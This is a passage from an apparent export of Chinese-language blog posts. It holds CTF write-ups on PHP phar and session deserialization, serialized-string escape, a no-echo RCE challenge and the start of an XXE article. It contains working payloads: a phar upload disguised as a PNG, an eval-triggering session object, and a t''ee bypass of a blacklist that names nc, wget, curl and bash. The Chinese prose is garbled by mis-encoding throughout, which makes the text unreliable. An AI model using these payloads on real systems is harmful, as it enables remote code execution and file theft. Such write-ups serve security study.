æ–‡ä»¶ä¸­ã€‚\n//è‡ªåŠ¨è®¡ç®—ç­¾å\n$phar->stopBuffering(); //è¿™ä¸€è¡Œä»£ç åœæ­¢ç¼“å†²æ“ä½œå¹¶å°†æ‰€æœ‰ç¼“å†²çš„æ›´æ”¹å†™å…¥ PHAR æ–‡ä»¶ã€‚stopBuffering æ–¹æ³•ä¼šå°†ä¹‹å‰ç¼“å†²çš„æ‰€æœ‰æ›´æ”¹å®é™…å†™å…¥åˆ° PHAR æ–‡ä»¶ä¸­ï¼Œä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚\n?>\n```\n\nå¯¹__HALT_COMPILER()æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥é€šè¿‡gzipå‘½ä»¤ç»•è¿‡ï¼Œå› ä¸ºåªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œæ‰€ä»¥ä¿®æ”¹åç¼€ä¸º.png\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161036193.png)\n\nä¸Šä¼ aa.png\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161039957.png)\n\nåœ¨class.phpä¸‹pharè¯»å–ï¼Œè¿›è¡Œååºåˆ—åŒ–\n\n```php\nfile=phar:///var/www/html/upload/321532365639f31b3b9f8ea8be0c6be2.png \n```\n\nè®¿é—®/1.phpï¼ŒGETä¼ å‚æ‰§è¡Œå‘½ä»¤\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161043057.png)\n\n## SESSIONçš„æ¦‚å¿µ\n\n`Session`ä¸€èˆ¬ç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€œï¼Œç®€å•æ¥è¯´å°±æ˜¯æ˜¯ä¸€ç§å®¢æˆ·ä¸ç½‘ç«™/æœåŠ¡å™¨æ›´ä¸ºå®‰å…¨çš„å¯¹è¯æ–¹å¼ã€‚ä¸€æ—¦å¼€å¯äº† `session` ä¼šè¯ï¼Œä¾¿å¯ä»¥åœ¨ç½‘ç«™çš„ä»»ä½•é¡µé¢ä½¿ç”¨æˆ–ä¿æŒè¿™ä¸ªä¼šè¯ï¼Œä»è€Œè®©è®¿é—®è€…ä¸ç½‘ç«™ä¹‹é—´å»ºç«‹äº†ä¸€ç§â€œå¯¹è¯â€æœºåˆ¶ã€‚å› ä¸ºHTTPåè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œé‚£å¦‚ä½•è¾¨åˆ«â€œä½ æ˜¯ä½ â€å‘¢ï¼Œé‚£å°±ç”¨åˆ°äº†sessionï¼Œé€šè¿‡cookieä¸­çš„sessionæ¥è¿›è¡Œç”¨æˆ·è¿½è¸ªã€‚\n\n## SESSIONçš„å·¥ä½œåŸç†\n\nå½“æˆ‘ä»¬å¼€å¯ä¸€ä¸ªsessionä¼šè¯æ—¶ï¼Œé¦–å…ˆphpä¼šå…ˆæŸ¥æ‰¾session_idï¼Œå¦‚æœåœ¨è¯·æ±‚çš„cookieä¸­ï¼ŒæœåŠ¡å™¨æ²¡æœ‰åœ¨GETæˆ–è€…POSTè¯·æ±‚æ–¹å¼ä¸­æ‰¾åˆ°session_idï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™phpå°±ä¼šè°ƒç”¨php_session_create_idå‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œåœ¨http-responseä¸­é€šè¿‡set-cookieå¤´éƒ¨å‘é€ç»™å®¢æˆ·ç«¯ï¼Œsessionåœ¨å®¢æˆ·ç«¯ä¿å­˜ã€‚\n\n**session_start()å‡½æ•°**\n\nä¸Šé¢è¯´äº†sessionçš„åˆ›å»ºï¼Œé‚£ä¹ˆä¸‹é¢æˆ‘ä»¬å°±è¦è¯´ä¸€ä¸‹sessionçš„åˆ›å»ºè¿‡ç¨‹ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹session_statrt()è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å¼€å¯ä¼šè¯ï¼Œåˆå§‹åŒ–sessionæ•°æ®\n\n```php\nSeesion_start()å‡½æ•°ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶Session_start()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161517719.png)\n\n## SESSIONçš„å­˜å‚¨æœºåˆ¶\n\nå†™ä¸€ä¸ªæµ‹è¯•ä»£ç ï¼š\n\n```php\n<?php\nhighlight_file(__FILE__);\nsession_start();\necho \"session_id(): \".session_id().\"<br>\";\necho \"COOKIE: \".$_COOKIE[\"PHPSESSID\"];\n\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161531721.png)\n\nå¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†ä¸€ä¸ªsession\n\næˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶å¤¹ï¼Œä¸€èˆ¬éƒ½åœ¨æ˜¯å­˜å‚¨åœ¨tmp/é‡Œé¢\n\n```\n/var/lib/php5/sess_PHPSESSID\n/var/lib/php7/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSED\nliunxå¸¸è§ä¿å­˜ä½ç½®\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161533665.png)\n\næœ€åä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬åˆšåˆ›å»ºçš„sessionäº†\n\næˆ‘ä»¬ç»™sessionèµ‹å€¼çœ‹çœ‹\n\n```php\n<?php\nhighlight_file(__FILE__);\nsession_start();\n$_SESSION['test1']='hello';\n$_SESSION['test2']='world';\necho '\\n';\necho \"session_id(): \" . session_id() . \"<br>\";\necho \"COOKIE: \" . $_COOKIE[\"PHPSESSID\"];\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161544088.png)\n\nå¯ä»¥çœ‹åˆ°æ•°æ®æ˜¯ä»¥åºåˆ—åŒ–çš„çŠ¶æ€å­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„\n\né‚£å°±æ˜¯HTTPè¯·æ±‚ä¸€ä¸ªé¡µé¢åï¼Œå¦‚æœç”¨åˆ°å¼€å¯sessionï¼Œä¼šå»è¯»COOKIEä¸­çš„PHPSESSIDæ˜¯å¦æœ‰ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™ä¼šæ–°ç”Ÿæˆä¸€ä¸ªsession_idï¼Œå…ˆå­˜å…¥COOKIEä¸­çš„PHPSESSIDä¸­ï¼Œå†ç”Ÿæˆä¸€ä¸ªsess_å‰ç¼€æ–‡ä»¶ã€‚å½“æœ‰å†™å…¥$_SESSIONçš„æ—¶å€™ï¼Œå°±ä¼šå¾€sess_æ–‡ä»¶é‡Œåºåˆ—åŒ–å†™å…¥æ•°æ®ã€‚å½“è¯»å–åˆ°sessionå˜é‡çš„æ—¶å€™ï¼Œå…ˆä¼šè¯»å–COOKIEä¸­çš„PHPSESSIDï¼Œè·å¾—session_idï¼Œç„¶åå†å»æ‰¾è¿™ä¸ªsess_session_idæ–‡ä»¶ï¼Œæ¥è·å–å¯¹åº”çš„æ•°æ®ã€‚ç”±äºé»˜è®¤çš„PHPSESSIDæ˜¯ä¸´æ—¶çš„ä¼šè¯ï¼Œåœ¨æµè§ˆå™¨å…³é—­åå°±ä¼šæ¶ˆå¤±ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨é‡æ–°è®¿é—®çš„æ—¶å€™ï¼Œå°±ä¼šæ–°ç”Ÿæˆsession_idå’Œsess_session_idè¿™ä¸ªæ–‡ä»¶ã€‚\n\n## SESSIONæ¨¡å—çš„å‚æ•°å«ä¹‰\n\n|          **Directive**          |                      **å«ä¹‰**                      |\n| :-----------------------------: | :------------------------------------------------: |\n|      session.save_handler       |            sessionä¿å­˜å½¢å¼ã€‚é»˜è®¤ä¸ºfiles            |\n|        session.save_path        |                 sessionä¿å­˜è·¯å¾„ã€‚                  |\n|    session.serialize_handler    |      sessionåºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨å¤„ç†å™¨ã€‚é»˜è®¤ä¸ºphpã€‚      |\n| session.upload_progress.cleanup | ä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œç«‹å³æ¸…é™¤è¿›åº¦ä¿¡æ¯ã€‚é»˜è®¤å¼€å¯ |\n| session.upload_progress.enabled |   å°†ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ä¿¡æ¯å­˜åœ¨sessionä¸­ã€‚é»˜è®¤å¼€å¯ã€‚    |\n\nä¸»è¦æœ‰ä¸‰ç§å¤„ç†å™¨\n\nå½“ **session.serialize_handler=php** æ—¶ï¼Œsessionæ–‡ä»¶å†…å®¹ä¸ºï¼š `name|s:7:\"mochazz\";`\n\nå½“ **session.serialize_handler=php_serialize** æ—¶ï¼Œsessionæ–‡ä»¶ä¸ºï¼š `a:1:{s:4:\"name\";s:7:\"mochazz\";}`\n\nå½“ **session.serialize_handler=php_binary** æ—¶ï¼Œsessionæ–‡ä»¶å†…å®¹ä¸ºï¼š `äºŒè¿›åˆ¶å­—ç¬¦names:7:\"mochazz\";`\n\nå¯ä»¥ç”¨ini_setæ¥æ”¹å˜å¤„ç†å™¨\n\n```php\n<?php\nini_set('session.serialize_handler','php_binary');\nsession_start();\n$_SESSION['name'] = $_GET['name'];\necho $_SESSION['name'];\n?>\n\n```\n\nå½“ [session.upload_progress.enabled](http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled) INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ã€‚\n\nå½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„[session.upload_progress.name](http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name)åŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨[$_SESSION](http://php.net/manual/zh/reserved.variables.session.php)ä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨[$_SESSION](http://php.net/manual/zh/reserved.variables.session.php)ä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯[session.upload_progress.prefix](http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix) ä¸ [session.upload_progress.name](http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name)è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚\n\n## SESSIONçš„ååºåˆ—åŒ–\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161556577.png)\n\nè¿™ä¹Ÿå°±æ˜¯SESSIONååºåˆ—åŒ–çš„åˆ‡å…¥ç‚¹äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡å†™å…¥SESSIONæ–‡ä»¶ï¼Œç„¶åè¯·æ±‚é¡µé¢ï¼Œè®©phpè‡ªè¡Œå°†æˆ‘ä»¬çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯é”®å€¼å¯¹ï¼Œé‚£ä¹ˆ`session`åºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨çš„å¤„ç†å™¨è‚¯å®šä¹Ÿæ˜¯å°†è¿™ä¸ªé”®å€¼å¯¹å†™äº†è¿›å»ï¼Œæ€ä¹ˆæ‰èƒ½è®©å®ƒæ­£å¥½ååºåˆ—åŒ–åˆ°æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ã€‚\n\nè¿™é‡Œå°±è¦ç”¨åˆ°æˆ‘ä»¬ä¸Šé¢ä»‹ç»åˆ°çš„ä¸åŒåºåˆ—åŒ–å¤„ç†å™¨çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æˆ‘ä»¬ä¼ å…¥çš„åºåˆ—åŒ–å†…å®¹å‰é¢åŠ ä¸€ä¸ª|,åœ¨php_serializeå¤„ç†åä¼šè¿”å›ä¸€ä¸ªåºåˆ—åŒ–åçš„æ•°ç»„ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨phpå¤„ç†å™¨ä¼šä»¥ç«–çº¿|ä½œä¸ºä¸€ä¸ªåˆ†éš”ç¬¦ï¼Œå‰é¢çš„ä¸ºé”®åï¼Œåé¢çš„ä¸ºé”®å€¼ï¼Œç„¶åå°†é”®å€¼è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¿™æ ·å°±èƒ½å¤Ÿå®ç°æˆ‘ä»¬sessionååºåˆ—åŒ–æ“ä½œã€‚\n\n### ç¤ºä¾‹\n\n```php\n<?php\nhighlight_file(__FILE__);\nini_set('session.serialize_handler', 'php');\n\nclass Test{\n    public $code;\n    function __destruct(){\n        eval($this->code);\n    }\n}\n\nsession_start();\nif (isset($_GET['test'])) {\n    $_SESSION['test'] = $_GET['test'];\n}\n?>\n?test=|O:4:\"Test\":1:{s:4:\"code\";s:10:\"phpinfo();\";}\n```\n\n### å°è¯•ç‰›åˆ€----[å®‰æ´µæ¯ 2019]easy_serialize_phpï¼ˆsessionååºåˆ—åŒ–+å‡é€ƒé€¸ï¼‰\n\n```php\n<?php\n\n$function = @$_GET['f'];\n\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n\nif($_SESSION){\n    unset($_SESSION);\n}\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\nextract($_POST);\n\nif(!$function){\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\n}\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n$serialize_info = filter(serialize($_SESSION));\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n} \n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161622229.png)\n\nä¼ å…¥phpinfoçœ‹ä¸€ä¸‹\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161724600.png)\n\nå¯ä»¥çœ‹åˆ°ï¼Œååºåˆ—åŒ–å¤„ç†å™¨æ˜¯phpï¼Œæ–‡ä»¶æç¤ºï¼Œd0g3_f1ag.php\n\né‚£ä¹ˆçœ‹ä»£ç å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰§è¡Œ`file_get_contents(base64_decode($userinfo['img']))`è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”ä¸€çœ‹å°±çŸ¥é“è¿˜æ˜¯å­—ç¬¦ä¸²å‡å°‘çš„å­—ç¬¦ä¸²é€ƒé€¸\n\n```php\nçœ‹ä»£ç ï¼Œéœ€è¦æ»¡è¶³f=show_image,è®©å­—ç¬¦ä¸²é€ƒé€¸\nåŸå§‹å­—ç¬¦ä¸²ä¸º\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n$_SESSION['img'] = base64_encode('guest_img.png');\nåºåˆ—åŒ–ä¸€ä¸‹çœ‹çœ‹\n<?php\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = 'show_image';\n$_SESSION['img'] = base64_encode('guest_img.png');\necho serialize($_SESSION);\na:3ï¼š{s:4:\"user\";s:5:\"guest\";s:8:\"function\";s:10:\"show_image\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}\nç°åœ¨è¦æŠŠimgç»™å¼„æˆZDBnM19mMWFnLnBocA==ï¼ˆd0g3_flag.phpçš„base64ç¼–ç ï¼‰\nä»userä¸‹æ‰‹ï¼ŒæŠŠguest\";s:8:\"function\";s:10:\"show_imageç»™åæ‰ï¼Œç„¶åè‡ªå·±å†é€ ä¸ªé”®å€¼å¯¹\nå³\n<?php\n$_SESSION[\"user\"] = 'flagflagflagflagflagflag';\n$_SESSION['function'] = 'a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:20:\"ZDBnM19mMWFnLnBocA==\";}';\n$_SESSION['dd'] = base64_encode('d0g3_f1ag.php');\necho serialize($_SESSION);\na:3:{s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:79:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:2:\"dd\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\n\n```\n\n\n\n## å‚è€ƒæ–‡ç« ï¼š\n\n[å¸¦ä½ èµ°è¿›PHP sessionååºåˆ—åŒ–æ¼æ´](https://xz.aliyun.com/t/6640?time__1311=n4%2BxnD0Dg7%3DYqBK0QD%2FiW4nrBeIe0K%3DQx)\n\n[sessionååºåˆ—åŒ–](https://www.cnblogs.com/GTL-JU/p/16859098.html)\n\n[PHPååºåˆ—åŒ–å…¥é—¨ä¹‹phar](https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%B8%80)\n\n[PHP Pharååºåˆ—åŒ–å­¦ä¹ ](https://www.cnblogs.com/CoLo/p/16786627.html)\n\n[Pharååºåˆ—åŒ–æ€»ç»“](https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)\n\n[PHPååºåˆ—åŒ– â€” å­—ç¬¦é€ƒé€¸](https://xz.aliyun.com/t/9213?time__1311=n4%2BxnD0DuAG%3DoxGqGNnmDUxYqxEkDcAA2xmupD)\n\n[é€šè¿‡CTFé¢˜ç›®å­¦ä¹ ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸](https://xz.aliyun.com/t/9895?time__1311=n4%2BxnD0DuDRD9B7NDsAoxCqw0r7ei%3D37tH4D)\n\n[å¹²è´§ | èƒ½çœ‹æ‡‚çš„PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æ¼æ´](https://cloud.tencent.com/developer/article/2226541)\n\n[PHPååºåˆ—åŒ–å…¥é—¨ä¹‹sessionååºåˆ—åŒ–](https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)","tags":["-phpååºåˆ—åŒ– -sessionååºåˆ—åŒ– -pharååºåˆ—åŒ– -php popé“¾ -phpå­—ç¬¦ä¸²é€ƒé€¸"]},{"title":"[NewStarCTF 2023 å…¬å¼€èµ›é“]RCE-æ— å›æ˜¾RCE","url":"/2024/07/11/NewStarCTF-2023-å…¬å¼€èµ›é“-RCE-æ— å›æ˜¾RCE/","content":"\n# [NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!\n\nè¿™é“é¢˜æ˜¯ååºåˆ—åŒ–+æ— å›æ˜¾RCE\n\nå…³é”®ç‚¹ï¼š[teeå‘½ä»¤](https://blog.csdn.net/G_D0120/article/details/136567416)\n\n```php\n <?php\nhighlight_file(__FILE__);\nclass minipop{\n    public $code;\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\nif(isset($_POST['payload'])){\n    //wanna try?\n    unserialize($_POST['payload']);\n} \n```\n\næºç å¦‚ä¸Šï¼Œä¸€çœ¼å°±æ˜¯ååºåˆ—åŒ–ï¼Œç›´æ¥æ„é€ \n\n```php\n<?php\nclass minipop{\n    public $code=\"ls\";\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\n$m=new minipop(); //åˆ›å»ºå¯¹è±¡\n$m->qwejaskdjnlka=new minipop();  //è§¦å‘__toString()\necho serialize($m);  //åºåˆ—åŒ–å¯¹è±¡\n?>\n```\n\nä½†æ˜¯å½“æˆ‘äº¤ä¸Šå»çš„æ—¶å€™å‘ç°æ²¡æœ‰å›åº”\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111110617.png)\n\nä¸€ç›´ä»¥ä¸ºæ˜¯æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œåæ¥ç»è¿‡å¤§ä½¬æŒ‡ç‚¹æ‰çŸ¥é“æ˜¯**æ— å›æ˜¾**ï¼Œé‚£ä¹ˆæ— å›æ˜¾RCEè¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Œå°±æ˜¯æŠŠæ‰§è¡Œç»“æœè¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶åè®¿é—®è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥äº†\n\n```php\n<?php\nclass minipop{\n    public $code=\"ls /|t''ee 1\"; //teeå‘½ä»¤è¾“å‡ºåˆ° 1 æ–‡ä»¶ï¼Œç”¨''ç»•è¿‡\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\n$m=new minipop();\n$m->qwejaskdjnlka=new minipop();\necho serialize($m);\n?>\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111116995.png)\n\nç„¶åæ‰§è¡Œcat /flag_is_h3eeere|t''ee 1å‘½ä»¤ï¼Œç›´æ¥è¯»å–flag\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111120971.png)","tags":["-RCE -ååºåˆ—åŒ–"]},{"title":"XXEå¤–éƒ¨æ³¨å…¥å®ä½“æ¼æ´_php","url":"/2024/07/10/XXEå¤–éƒ¨æ³¨å…¥å®ä½“æ¼æ´-php/","content":"\n# XXEå¤–éƒ¨å®ä½“æ¼æ´\n\n## XMLå’ŒDTD\n\n### XMLä¸HTMLçš„åŒºåˆ«\n\nXMLæ˜¯è¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹\n\nHTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚\n\nHTMLä¸»è¦æ˜¯æ˜¾ç¤ºä¿¡æ¯ï¼Œè€ŒXMLä¸»è¦ä¼ è¾“ä¿¡æ¯\n\næ‰€ä»¥ï¼Œå¦‚æœä¸ä¸¥è°¨çš„è¯ï¼Œå°±ä¼šé€ æˆXMLå»ä¼ è¾“ä¸€äº›æ¶æ„çš„ä¿¡æ¯\n\n### æ¼æ´æˆå› \n\nXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³ã€‚xxeæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼ˆå°±æ˜¯æœ‰ä¸Šä¼ xmlæ–‡ä»¶çš„å…¥å£ç‚¹ï¼‰ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚\n\n### XMLçš„æ ¼å¼\n\n```dtd\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> //å£°æ˜XMLæ–‡æ¡£\n\n<!DOCTYPE note [\n  <!ELEMENT note (to,from,heading,body)>\n  <!ELEMENT to      (#PCDATA)>\t\t\t\t\n  <!ELEMENT from    